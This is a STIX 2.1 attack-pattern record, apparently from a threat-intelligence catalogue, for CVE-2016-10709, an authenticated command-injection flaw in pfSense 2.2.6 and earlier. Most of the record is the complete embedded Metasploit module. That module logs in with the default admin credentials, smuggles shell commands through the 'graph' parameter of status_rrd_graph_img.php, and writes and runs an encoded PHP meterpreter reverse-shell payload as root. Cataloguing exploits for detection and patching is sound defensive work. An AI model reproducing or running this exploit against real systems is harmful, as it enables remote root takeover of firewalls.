{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--39b9aead-caf5-47fc-9c54-fc3aa8b99a13",
    "created": "2024-08-14T17:14:47.472648Z",
    "modified": "2024-08-14T17:14:47.472653Z",
    "name": "pfSense authenticated graph status RCE",
    "description": "( pfSense, a free BSD based open source firewall distribution version <= 2.2.6 contains a remote command execution vulnerability post authentication in the _rrd_graph_img.php page. The vulnerability occurs via the graph GET parameter. A non-administrative authenticated attacker can inject arbitrary operating system commands and execute them as the root user. Verified against 2.2.6, 2.2.5, and 2.1.3. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pfsense_graph_injection_exec.rb",
            "external_id": "pfsense_graph_injection_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10709"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'pfSense authenticated graph status RCE',\n        'Description' => %q(\n          pfSense, a free BSD based open source firewall distribution,\n          version <= 2.2.6 contains a remote command execution\n          vulnerability post authentication in the _rrd_graph_img.php page.\n          The vulnerability occurs via the graph GET parameter. A non-administrative\n          authenticated attacker can inject arbitrary operating system commands\n          and execute them as the root user. Verified against 2.2.6, 2.2.5, and 2.1.3.\n        ),\n        'Author'      =>\n          [\n            'Security-Assessment.com', # discovery\n            'Milton Valencia',         # metasploit module <wetw0rk>\n            'Jared Stephens',          # python script     <mvrk>\n          ],\n        'References'  =>\n          [\n            [ 'CVE', '2016-10709' ],\n            [ 'EDB', '39709' ],\n            [ 'URL', 'http://www.security-assessment.com/files/documents/advisory/pfsenseAdvisory.pdf']\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => 'php',\n        'Privileged'     => 'true',\n        'DefaultOptions' =>\n          {\n            'SSL'     => true,\n            'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n            'Encoder' => 'php/base64'\n          },\n        'Arch'           => [ ARCH_PHP ],\n        'Payload'        =>\n          {\n            'Space'  => 6000,\n            'Compat' =>\n              {\n                'ConnectionType' => '-bind',\n              }\n          },\n        'Targets'        => [[ 'Automatic Target', {} ]],\n        'DefaultTarget'  => 0,\n        'DisclosureDate' => '2016-04-18',\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME',  [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD',  [ true, 'Password to login with', 'pfsense']),\n        Opt::RPORT(443)\n      ], self.class\n    )\n  end\n\n  def login\n    res = send_request_cgi(\n      'uri' => '/index.php',\n      'method' => 'GET'\n    )\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code != 200\n\n    /var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n    vprint_status(\"CSRF Token for login: #{csrf}\")\n\n    res = send_request_cgi(\n      'uri' => '/index.php',\n      'method' => 'POST',\n      'vars_post' => {\n        '__csrf_magic' => csrf,\n        'usernamefld'  => datastore['USERNAME'],\n        'passwordfld'  => datastore['PASSWORD'],\n        'login'        => ''\n      }\n    )\n    unless res\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to authentication request\")\n    end\n    if res.code == 302\n      vprint_status(\"Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      return res.get_cookies\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Authentication Failed: #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      return nil\n    end\n  end\n\n  def detect_version(cookie)\n    res = send_request_cgi(\n      'uri' => '/index.php',\n      'method' => 'GET',\n      'cookie' => cookie\n    )\n    unless res\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to authentication request\")\n    end\n    /Version.+<strong>(?<version>[0-9\\.\\-RELEASE]+)[\\n]?<\\/strong>/m =~ res.body\n    if version\n      print_status(\"Detected pfSense #{version}, uploading intial payload\")\n      return Rex::Version.new(version)\n    end\n    # If the device isn't fully setup, you get stuck at redirects to wizard.php\n    # however, this does NOT stop exploitation strangely\n    print_error('pfSense version not detected or wizard still enabled.')\n    Rex::Version.new('0.0')\n  end\n\n  def exploit\n    begin\n      cookie   = login\n      version  = detect_version(cookie)\n      filename = rand_text_alpha(rand(1..10))\n\n      # generate the PHP meterpreter payload\n      stager = 'echo \\'<?php '\n      stager << payload.encode\n      stager << \"?>\\' > #{filename}\"\n      # here we begin the encoding process to\n      # convert the payload to octal! Ugly code\n      # don't look\n      complete_stage = \"\"\n      for i in 0..(stager.length()-1)\n        if version.to_s =~ /2.2/\n          complete_stage << '\\\\'\n        end\n        complete_stage << \"\\\\#{stager[i].ord.to_s(8)}\"\n      end\n\n      res = send_request_cgi(\n        'uri'      => '/status_rrd_graph_img.php',\n        'method'   => 'GET',\n        'cookie'   => cookie,\n        'vars_get' => {\n          'database' => '-throughput.rrd',\n          'graph'    => \"file|printf '#{complete_stage}'|sh|echo\",\n        }\n      )\n\n      if res && res.code == 200\n        print_status('Payload uploaded successfully, executing')\n        register_file_for_cleanup(filename)\n      else\n        print_error('Failed to upload payload...')\n      end\n\n      res = send_request_cgi({\n        'uri'     => '/status_rrd_graph_img.php',\n        'method'  => 'GET',\n        'cookie'  => cookie,\n        'vars_get' => {\n          'database' => '-throughput.rrd',\n          'graph'    => \"file|php #{filename}|echo \"\n        }\n      })\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-04-18",
    "x_mitre_platforms": [
        "php'"
    ]
}